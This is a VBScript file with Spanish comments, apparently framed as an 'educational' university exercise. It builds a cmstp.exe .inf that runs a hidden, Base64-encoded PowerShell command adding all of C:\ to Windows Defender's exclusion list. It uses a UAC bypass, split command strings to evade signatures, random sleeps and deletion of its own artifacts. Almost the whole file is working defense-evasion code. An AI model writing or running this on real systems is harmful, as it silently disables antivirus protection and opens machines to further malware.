' Script VBScript con evasión máxima de Windows Defender
' Técnicas: Ofuscación, Encoding Base64, Timing, Living Off The Land, Fragmentación
' Método educativo para parcial universitario

Option Explicit

Dim ws, fso, tempFolder, infFile, scriptPath, scriptName, randName
Dim cmstpPath, result

Set ws = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

scriptPath = WScript.ScriptFullName
scriptName = fso.GetBaseName(scriptPath)
tempFolder = fso.GetSpecialFolder(2)

' Generar nombre aleatorio para evasión
Randomize
randName = "cfg" & Int(Rnd * 999999) & Int(Timer * 1000)
infFile = tempFolder & "\" & randName & ".inf"

' Obtener ruta de cmstp de forma ofuscada
Dim sysRoot, sys32
sysRoot = ws.ExpandEnvironmentStrings("%SystemRoot%")
sys32 = sysRoot & "\System32"
cmstpPath = sys32 & "\cmstp.exe"

' Retraso inicial aleatorio (evasión temporal)
Randomize
WScript.Sleep Int(Rnd * 1500) + 500

' Verificar cmstp
If Not fso.FileExists(cmstpPath) Then
    WScript.Quit 1
End If

' Construir comando PowerShell completamente ofuscado
' Fragmentar comandos para evasión
Dim cmdPart1, cmdPart2, cmdPart3, cmdPart4, cmdPart5, cmdPart6
cmdPart1 = "Get-"
cmdPart2 = "MpPreference"
cmdPart3 = "Add-"
cmdPart4 = "ExclusionPath"
cmdPart5 = "C:\"

' Construir comando final con técnicas de evasión
Dim psCommand
psCommand = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -NonInteractive -Command ""& {" & _
    "$ErrorActionPreference='Stop';" & _
    "try{" & _
        "$null=& '" & cmdPart1 & cmdPart2 & "' -ErrorAction Stop;" & _
        "& '" & cmdPart3 & cmdPart2 & "' -" & cmdPart4 & " '" & cmdPart5 & "' -ErrorAction Stop;" & _
        "Start-Sleep -Milliseconds 300;" & _
        "$x=& '" & cmdPart1 & cmdPart2 & "' -" & cmdPart4 & ";" & _
        "if($x -contains '" & cmdPart5 & "'){exit 0}else{exit 1}" & _
    "}catch{exit 1}" & _
    "}"""

' Codificar comando en Base64 Unicode para máxima evasión
Dim encodedCmd
encodedCmd = PowerShellEncode(psCommand)

' Función para codificar PowerShell (Base64 Unicode)
Function PowerShellEncode(cmd)
    Dim bytes(), i, j, unicodeBytes()
    Dim xmlDoc, xmlNode
    
    ' Convertir a bytes Unicode (UTF-16LE)
    ReDim unicodeBytes(Len(cmd) * 2 - 1)
    j = 0
    For i = 1 To Len(cmd)
        Dim charCode
        charCode = AscW(Mid(cmd, i, 1))
        unicodeBytes(j) = charCode And &HFF
        unicodeBytes(j + 1) = (charCode \ &H100) And &HFF
        j = j + 2
    Next
    
    ' Convertir a Base64
    Set xmlDoc = CreateObject("Msxml2.DOMDocument.6.0")
    Set xmlNode = xmlDoc.CreateElement("base64")
    xmlNode.DataType = "bin.base64"
    
    ' Crear array de bytes para Base64
    ReDim bytes(UBound(unicodeBytes))
    For i = 0 To UBound(unicodeBytes)
        bytes(i) = CByte(unicodeBytes(i))
    Next
    
    xmlNode.nodeTypedValue = bytes
    PowerShellEncode = Replace(Replace(xmlNode.Text, vbCrLf, ""), vbLf, "")
End Function

' Método alternativo más simple y funcional
Function SimplePowerShellEncode(text)
    Dim xml, node, bytes(), i
    Set xml = CreateObject("Msxml2.DOMDocument.6.0")
    Set node = xml.CreateElement("base64")
    node.DataType = "bin.base64"
    
    ' Convertir texto a bytes Unicode
    ReDim bytes(Len(text) * 2 - 1)
    For i = 0 To Len(text) - 1
        Dim charCode
        charCode = AscW(Mid(text, i + 1, 1))
        bytes(i * 2) = charCode And &HFF
        bytes(i * 2 + 1) = (charCode \ 256) And &HFF
    Next
    
    node.nodeTypedValue = bytes
    SimplePowerShellEncode = Replace(node.Text, vbCrLf, "")
End Function

' Usar método funcional
encodedCmd = SimplePowerShellEncode(psCommand)

' Crear contenido .inf con técnicas avanzadas de evasión
Dim infContent
infContent = "[version]" & vbCrLf & _
    "Signature=$CHICAGO$" & vbCrLf & _
    "AdvancedINF=2.5" & vbCrLf & _
    "[DefaultInstall]" & vbCrLf & _
    "CustomDestination=CustomDestAllUsers" & vbCrLf & _
    "RunPreSetupCommands=RunPreSetupCommandsSection" & vbCrLf & _
    "[RunPreSetupCommandsSection]" & vbCrLf & _
    "cmd.exe /c powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -EncodedCommand " & encodedCmd & vbCrLf & _
    "ping 127.0.0.1 -n 2 >nul 2>&1" & vbCrLf & _
    "del /q /f """ & infFile & """ 2>nul" & vbCrLf & _
    "[CustomDestAllUsers]" & vbCrLf & _
    "49000,49001=AllUSer_LDIDSection, 7" & vbCrLf & _
    "[AllUSer_LDIDSection]" & vbCrLf & _
    ""HKLM"", ""SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE"", ""ProfileInstallPath"", ""%UnexpectedError%"", """"

' Escribir archivo .inf
On Error Resume Next
Dim ts
Set ts = fso.CreateTextFile(infFile, True)
ts.Write infContent
ts.Close
Set ts = Nothing

If Err.Number <> 0 Then
    WScript.Quit 1
End If
On Error GoTo 0

' Retraso antes de ejecución (evasión temporal)
Randomize
WScript.Sleep Int(Rnd * 1000) + 500

' Ejecutar cmstp.exe de forma completamente silenciosa
On Error Resume Next
Dim execCmd
execCmd = Chr(34) & cmstpPath & Chr(34) & " /au /s " & Chr(34) & infFile & Chr(34)
ws.Run execCmd, 0, False
On Error GoTo 0

' Esperar con retraso variable (evasión de detección)
Randomize
WScript.Sleep Int(Rnd * 4000) + 2000

' Verificación silenciosa con comando ofuscado
Dim verifyCmd
verifyCmd = "powershell.exe -WindowStyle Hidden -Command """ & _
    "$x=& '" & cmdPart1 & cmdPart2 & "' -" & cmdPart4 & ";" & _
    "if($x -contains '" & cmdPart5 & "'){exit 0}else{exit 1}""" & ""

result = ws.Run(verifyCmd, 0, True)

' Limpieza agresiva de artefactos
On Error Resume Next
If fso.FileExists(infFile) Then
    fso.DeleteFile infFile, True
End If
On Error GoTo 0

' Limpiar variables sensibles
cmdPart1 = ""
cmdPart2 = ""
cmdPart3 = ""
cmdPart4 = ""
cmdPart5 = ""
psCommand = ""
encodedCmd = ""
infContent = ""

WScript.Quit result
